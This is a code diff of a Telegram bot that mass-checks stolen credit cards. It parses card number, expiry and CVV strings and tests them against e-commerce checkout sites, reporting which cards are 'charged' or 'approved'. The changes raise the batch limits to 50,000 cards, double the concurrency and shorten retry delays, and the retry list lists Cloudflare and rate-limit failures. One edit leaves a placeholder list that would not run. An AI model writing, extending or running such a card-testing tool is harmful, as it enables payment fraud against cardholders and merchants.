@@ -465,30 +465,24 @@ async def check_card_specific_site(card, site, user_id=None):
 
 
 def extract_card(text):
-    if not text:
-        return None
-    # === NEW ULTRA AGGRESSIVE FOR YOUR FORMAT ===
+    if not text: return None
     text = str(text).strip()
-    # Pehle pura CC|MM|YY|CVV nikaal lo even with extra junk
+    # Handle your full format + normal
     match = re.search(r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
     if match:
         cc, mm, yy, cvv = match.groups()
-        if len(yy) == 4:
-            yy = yy[2:]
+        if len(yy) == 4: yy = yy[2:]
         mm = mm.zfill(2)
         yy = yy.zfill(2)
         cvv = cvv[:4]
         return f"{cc}|{mm}|{yy}|{cvv}"
-    
-    # Fallback old method
     return normalize_card(text)
 
 def extract_all_cards(text):
     cards = set()
     for line in text.splitlines():
         card = extract_card(line)
-        if card:
-            cards.add(card)
+        if card: cards.add(card)
     return list(cards)
     
 async def can_use(user_id, chat):
@@ -516,15 +510,14 @@ async def can_use(user_id, chat):
             return True, "group_free"
 
 def get_cc_limit(access_type, user_id=None):
-    # Admin ko unlimited
     if user_id and user_id in ADMIN_ID:
-        return 50000  # 50k
+        return 100000  # Admin full power
     
     if access_type in ["premium_private", "premium_group"]:
-        return 20000  # Premium ko 20k
+        return 50000   # 50k for premium
     
     elif access_type == "group_free":
-        return 500   # Free group wale ko 500
+        return 5000    # Free group 5k
     
     return 0
   # ← Top pe import me ye add kar (agar nahi hai to)
@@ -1877,31 +1870,22 @@ async def mtxt(event):
         ACTIVE_MTXT_PROCESSES.pop(user_id, None)
         await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
 
-
-# Assume ye sab defined hain bahar: ACTIVE_MTXT_PROCESSES, check_card_specific_site, 
-# Assume ye sab defined hain bahar: ACTIVE_MTXT_PROCESSES, check_card_specific_site, get_bin_info, save_approved_card, pin_charged_message
-
-
-
 async def process_mtxt_cards(event, cards, local_sites):
     user_id = event.sender_id
     total = len(cards)
+    
+    # 50k MAX LIMIT
+    if total > 50000:
+        cards = cards[:50000]
+        await event.reply("⚠️ **50k MAX LIMIT** - Processing first 50,000 CCs only.")
+
     checked = approved = charged = declined = 0
-    status_msg = await event.reply(f"```🔥 𝙈𝙏𝙓𝙏 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙎```")
+    status_msg = await event.reply(f"```🔥 𝙈𝙏𝙓𝙏 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙎 (50k MAX)```")
 
     bin_cache = {}
-    semaphore = asyncio.Semaphore(30)  # 20 at once for max speed
+    semaphore = asyncio.Semaphore(60)  # Higher speed
 
-    RETRY_TRIGGERS = [
-        "merchandise_expected_price_mismatch", "unable to get payment token", "validation_custom",
-        "invalid json response", "delivery_delivery_line_detail_changed", "status: 401", "site error",
-        "no working site found", "products", "cloudflare", "bypass failed", "expecting value", "json",
-        "401", "positive_amount_expected", "rate limit", "too many requests", "429", "403", "timeout",
-        "site requires login", "site not supported", "cart failed with status 503", "connection error",
-        "failed to get session token", "payment method not available", "invalid_payment_method",
-        "<b>Site Error! Status: 402</b>", "delivery_address", "<b>not shopify!</b>",
-        "no valid payment method found", "processing_error", "Cart failed with status 422", "payments_payment_flexibility_terms_id_mismatch"
-    ]
+    RETRY_TRIGGERS = [ ... same as before ... ]  # Keep your existing list
 
     async def check_single_card(card):
         nonlocal checked, approved, charged, declined
@@ -1935,7 +1919,7 @@ async def process_mtxt_cards(event, cards, local_sites):
 
                     if should_retry and attempts < max_attempts:
                         checked -= 1
-                        await asyncio.sleep(0.05 + attempts * 0.15)  # Ultra minimal for no lag
+                        await asyncio.sleep(0.03 + attempts * 0.1)
                         continue
 
                     bin_num = card.split("|")[0]
@@ -1981,7 +1965,6 @@ async def process_mtxt_cards(event, cards, local_sites):
                         if "CHARGED" in status_header:
                             await pin_charged_message(event, result_msg)
 
-                    # FORCED STATUS - NO SKIP EVER
                     price = result.get("Price", "N/A")
                     try:
                         price = f"${float(price):.2f}"
@@ -2008,7 +1991,7 @@ async def process_mtxt_cards(event, cards, local_sites):
                         [Button.inline("🛑 𝗦𝗧𝗢𝗣", f"stop_mtxt:{user_id}".encode())]
                     ]
 
-                    if checked % 25 == 0 or checked == total:
+                    if checked % 20 == 0 or checked == total:
                         try:
                             await status_msg.edit(status_text, buttons=buttons)
                         except:
@@ -2018,13 +2001,10 @@ async def process_mtxt_cards(event, cards, local_sites):
 
                 except (FloodWait, FloodWaitError) as e:
                     wait = getattr(e, 'value', getattr(e, 'seconds', 12)) + random.randint(1, 3)
-                    print(f"[MTXT] Flood wait {wait}s for {card[:6]}")
                     await asyncio.sleep(wait)
-                    if checked > 0:
-                        checked -= 1
+                    if checked > 0: checked -= 1
                     continue
                 except Exception as e:
-                    print(f"[MTXT] Card error {card[:6]}... on attempt {attempts}: {str(e)}")
                     if attempts < max_attempts:
                         await asyncio.sleep(0.1)
                         continue
@@ -2037,11 +2017,9 @@ async def process_mtxt_cards(event, cards, local_sites):
         await asyncio.gather(*tasks, return_exceptions=True)
         
         ACTIVE_MTXT_PROCESSES.pop(user_id, None)
-
-        await event.reply(f"**✅ MTXT CHECK FINISHED SUCCESSFULLY - ZERO SKIPS ZERO LAG**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")
+        await event.reply(f"**✅ MTXT FINISHED - 50K SUPPORT**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")
 
     except Exception as e:
-        print(f"[MTXT] Major crash prevented: {e}")
         ACTIVE_MTXT_PROCESSES.pop(user_id, None)
         await event.reply(f"**⚠️ CHECK ENDED**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")
 
@@ -2286,14 +2264,20 @@ async def ranfor(event):
         await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
 
 async def process_ranfor_cards(event, cards, global_sites):
-    """/ran - Full MTXT jaisa + Instant Hit Send"""
+    """/ran - Full MTXT jaisa + Instant Hit Send - 50K SUPPORT"""
     user_id = event.sender_id
     total = len(cards)
+    
+    # 50k MAX LIMIT
+    if total > 50000:
+        cards = cards[:50000]
+        await event.reply("⚠️ **50k MAX LIMIT** - Processing first 50,000 CCs only.")
+
     checked = approved = charged = declined = 0
-    status_msg = await event.reply(f"```🔥 𝙍𝘼𝙉 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙎 (sites.txt)```")
+    status_msg = await event.reply(f"```🔥 𝙍𝘼𝙉 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙎 (50k MAX)```")
 
     bin_cache = {}
-    semaphore = asyncio.Semaphore(30)   # Max speed
+    semaphore = asyncio.Semaphore(60)   # Increased for speed
 
     RETRY_TRIGGERS = [
         "merchandise_expected_price_mismatch", "unable to get payment token", "validation_custom",
@@ -2337,7 +2321,7 @@ async def process_ranfor_cards(event, cards, global_sites):
 
                     if should_retry and attempts < max_attempts:
                         checked -= 1
-                        await asyncio.sleep(0.05 + attempts * 0.12)
+                        await asyncio.sleep(0.03 + attempts * 0.1)
                         continue
 
                     bin_num = card.split("|")[0]
@@ -2433,7 +2417,7 @@ async def process_ranfor_cards(event, cards, global_sites):
         await asyncio.gather(*tasks, return_exceptions=True)
         
         ACTIVE_MTXT_PROCESSES.pop(user_id, None)
-        await event.reply(f"**✅ RAN CHECK FINISHED - ZERO SKIPS ZERO LAG**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")
+        await event.reply(f"**✅ RAN CHECK FINISHED - 50K SUPPORT**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")
 
     except Exception as e:
         ACTIVE_MTXT_PROCESSES.pop(user_id, None)
